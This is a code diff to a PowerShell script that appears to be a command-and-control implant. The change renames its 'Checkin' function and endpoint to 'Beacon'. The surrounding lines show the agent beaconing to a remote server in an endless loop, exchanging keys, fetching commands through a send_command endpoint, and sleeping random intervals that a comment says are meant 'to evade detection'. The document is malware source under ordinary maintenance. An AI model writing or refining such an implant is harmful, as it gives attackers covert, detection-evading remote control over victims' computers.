@@ -16,7 +16,7 @@ $sovereign_folder = "C:\sovereign"
 $agent_id_file = "$sovereign_folder\agent_id.txt"
 $log_file = "$sovereign_folder\agent_log.txt"
 $public_key_url = "$server_url/public_key"
-$checkin_url = "$server_url/checkin"
+$checkin_url = "$server_url/beacon"  # Renamed URL
 $exchange_key_url = "$server_url/exchange_key"
 $send_command_url = "$server_url/send_command"
 
@@ -59,13 +59,13 @@ function Get-PublicKey {
     return $public_key_response.PublicKey
 }
 
-# Check in with the server
-function Checkin {
+# Beacon with the server
+function Beacon {
     try {
         $response = Invoke-RestMethod -Uri $checkin_url -Method Post -Body (@{AgentID = $agent_id} | ConvertTo-Json) -ContentType "application/json"
-        Log-Message "Checkin Response: $($response | ConvertTo-Json -Depth 3)"
+        Log-Message "Beacon Response: $($response | ConvertTo-Json -Depth 3)"
     } catch {
-        Log-Message "Error during check-in: $_"
+        Log-Message "Error during beacon: $_"
     }
 }
 
@@ -205,8 +205,8 @@ function Send-Result {
 function MainLoop {
     while ($true) {
         try {
-            # Periodically check-in with the server (beacon)
-            Checkin
+            # Periodically beacon with the server
+            Beacon
 
             # Sleep for a randomized interval to evade detection
             $sleep_time = Get-Random -Minimum $evade_interval_min -Maximum $evade_interval_max
@@ -232,6 +232,6 @@ function MainLoop {
 }
 
 # Main script execution
-Checkin
+Beacon  # Updated function name
 ExchangeKey
 MainLoop
